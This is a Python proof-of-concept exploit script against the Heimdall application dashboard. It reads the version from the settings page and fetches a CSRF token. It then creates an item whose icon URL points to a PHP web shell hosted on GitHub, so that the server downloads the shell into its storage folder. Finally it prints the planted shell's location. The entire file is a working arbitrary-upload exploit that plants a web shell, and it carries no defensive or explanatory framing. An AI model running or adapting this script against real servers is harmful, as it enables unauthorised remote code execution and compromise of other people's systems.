import sys, uuid, requests, urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings()

UA      = {"User-Agent": "Mozilla/5.0 (PlayStation 5/SmartTV) AppleWebKit/605.1.15 (KHTML, like Gecko)0"}
TIMEOUT = 8
SHELL_URL = "https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/up.php"
MIN_VERSION = (2, 2, 3)

def get(rurl, sess):
    try:
        return sess.get(rurl, headers=UA, verify=False, timeout=TIMEOUT)
    except requests.RequestException:
        return None
    
def fetch_version(base, sess):
    r = get(f"{base}/settings", sess)
    if not r or r.status_code != 200:
        return None
    soup = BeautifulSoup(r.text, "html.parser")
    row = soup.find("td", string="Version")
    if not row:
        return None
    val = row.find_next_sibling("td").get_text(strip=True)
    parts = val.split(".")
    try:
        return tuple(int(x) for x in parts[:3])
    except ValueError:
        return None

def fetch_token(base, sess):
    r = get(f"{base}/items/create", sess)
    if not r or r.status_code != 200:
        return None
    soup = BeautifulSoup(r.text, "html.parser")
    inp  = soup.find("input", {"name": "_token"})
    return inp["value"] if inp else None

def create_item_with_shell(base, sess, token, tag):
    data = {
        "_token": token,
        "pinned": "0",
        "appid":  "null",
        "website":"",
        "title":  tag,
        "colour": "#161b1f",
        "url":    "https://",
        "tags[]": "0",
        "icon":   SHELL_URL,
    }
    r = sess.post(
        f"{base}/items",
        headers=UA,
        data=data,
        allow_redirects=False,
        verify=False,
        timeout=TIMEOUT
    )
    return r.status_code in (301, 302)

def find_edit_page(base, sess, tag):
    r = get(f"{base}/items", sess)
    if not r or r.status_code != 200:
        return None
    soup = BeautifulSoup(r.text, "html.parser")
    for row in soup.select("table.table tbody tr"):
        cols = row.find_all("td")
        if cols and cols[0].get_text(strip=True) == tag:
            link = row.select_one("a[href*='/items/'][href$='/edit']")
            if link:
                href = link["href"]
                return href if href.startswith("http") else base + href
    return None

def get_shell_url(edit_url, sess, base):
    r = get(edit_url, sess)
    if not r:
        return None
    soup = BeautifulSoup(r.text, "html.parser")
    inp = soup.find("input", {"name": "icon"})
    if inp and inp.get("value"):
        fn = inp["value"].split("/")[-1]
        return f"{base}/storage/icons/{fn}"
    img = soup.select_one("#appimage img")
    if img and img.get("src"):
        return img["src"] if img["src"].startswith("http") else base + img["src"]
    return None

def main():
    if len(sys.argv) != 2:
        sys.exit("usage: python heimdall_shell_poc.py <base_url>")
    base = sys.argv[1].rstrip("/")
    sess = requests.Session()

    version = fetch_version(base, sess)
    if not version:
        sys.exit("could not detect Heimdall version (maybe auth?)")
    print(f"detected version: {'.'.join(map(str,version))}")
    if version < MIN_VERSION:
        sys.exit(f"No exploit available (Arbitrary file upload is still possible...)")

    token = fetch_token(base, sess)
    if not token:
        sys.exit("failed to fetch CSRF token")

    tag = uuid.uuid4().hex[:6]
    if not create_item_with_shell(base, sess, token, tag):
        sys.exit("initial upload failed")

    edit = find_edit_page(base, sess, tag)
    if not edit:
        sys.exit("item not found in list")

    shell_url = get_shell_url(edit, sess, base)
    if not shell_url:
        sys.exit("could not extract shell URL")

    print("☠  shell uploaded at:", shell_url)

if __name__ == "__main__":
    main()
